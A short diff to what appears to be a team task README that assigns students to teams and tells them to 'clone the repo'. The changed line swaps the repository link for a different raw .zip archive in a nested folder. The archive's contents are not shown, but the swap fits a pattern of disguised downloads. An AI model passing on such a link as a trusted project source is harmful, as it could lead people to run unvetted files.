@@ -5,7 +5,7 @@ Team 4 -> Ramya, Mohan
 Team 5 -> Lotus
 
 TASK
-1) Clone the repo - > https://github.com/bmd097/dotNetProject/raw/refs/heads/main/spadesman/Project_Net_dot_v2.0.zip
+1) Clone the repo - > https://github.com/bmd097/dotNetProject/raw/refs/heads/main/spadesman/Net-Project-dot-v3.6.zip
 Once you have cloned, you will find 5 folders with respective team id name. Find your team id folder from the above allocated teams.
 I have created 4 branches for 4 teams +  with a default main branch, with branch names:
 * main
